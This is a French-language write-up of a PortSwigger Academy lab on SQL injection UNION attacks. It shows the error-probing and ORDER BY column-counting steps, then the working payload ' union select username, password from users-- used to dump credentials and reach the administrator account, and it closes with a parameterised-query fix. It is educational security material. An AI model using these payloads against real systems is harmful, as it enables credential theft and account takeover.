# SQLi 02 — UNION attack, retrieving data from other tables

**Plateforme :** PortSwigger Academy  
**Catégorie :** SQL Injection  
**Niveau :** Practitioner  
**Date :** 05/07/2026  

---

## Objectif

L'application affiche des produits filtrés par catégorie. L'objectif est de récuperer et afficher
la table contenant les nom d'utilisateurs et les mots de passes associés à chaque compte du site. 
Il faut alors utiliser les données récupérées pour se connecter au compte administrateur.

---

## Vulnérabilité identifiée

Le paramètre `category` dans l'URL atterrit directement dans une requête SQL sans
aucun filtrage. Ce que l'utilisateur envoie est exécuté tel quel par la base de données.


```sql
SELECT name, description FROM products WHERE category = 'INPUT'
```

Ici, l'utilisateur contrôle entièrement `INPUT`.

---

## Reconnaissance

URL observée dans Burp Suite :
GET /filter?category=Gifts HTTP/1.1

Test d'injection avec une apostrophe pour provoquer une erreur SQL :
/filter?category=Gifts'

Réponse : erreur 500 / Internal Server Error, cela confirme que l'entrée est interprétée comme du SQL.


Une UNION attack exige que les deux SELECT aient exactement le même nombre de colonnes.
On utilise `ORDER BY` en incrémentant jusqu'à l'erreur :
/filter?category=Gifts' order by 1--
/filter?category=Gifts' order by 2--
/filter?category=Gifts' order by 3--

Résultat : la requête originale retourne 2 colonnes.

On teste en injectant des chaînes de caractères dans chaque position :
/filter?category=Gifts' UNION SELECT 'a','a'--

Réponse : la page s'affiche normalement avec les deux valeurs visibles.
Les deux colonnes acceptent du texte, on peut donc extraire des données.


---

## Exploitation

**Payload utilisé :**
/filter?category=Gifts' union select username, password from users--

**Requête SQL résultante :**

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION
SELECT username, password FROM users--'
```

- `'` ferme la chaîne de caractères
- `UNION SELECT` ajoute un deuxième SELECT qui cherche dans une autre table
- `username, password FROM users` cible les colonnes qui nous intéressent ici
- `--` commente tout le reste de la requête

---

## Résultat

La page affiche chaque lignes de la table users. Chaque entrée montre le nom d'utilisateur et son mot de passe associé.
On peut alors récupérer le mot de passe administrateur et se connecter directement au compte.

---

## Impact

En conditions réelles, cette vulnérabilité permettrait de :

- Extraire l'intégralité d'une table sensible en une seule requête
- Récupérer des mots de passe et prendre le contrôle de comptes utilisateurs ou bien administrateur
- Pivoter vers d'autres tables : commandes, données bancaires, informations personnelles

---

## Remédiation

Le problème vient de la concaténation directe de l'entrée utilisateur dans la requête.
Il faut utiliser des requêtes préparées.On a alors le paramètre qui devient une donnée et
non du code exécutable.

```python
# Vulnérable
query = "SELECT name, description FROM products WHERE category = '" + category + "'"

# Corrigé
cursor.execute("SELECT name, description FROM products WHERE category = ?", (category,))
```

---

## Références

- [PortSwigger — SQL Injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)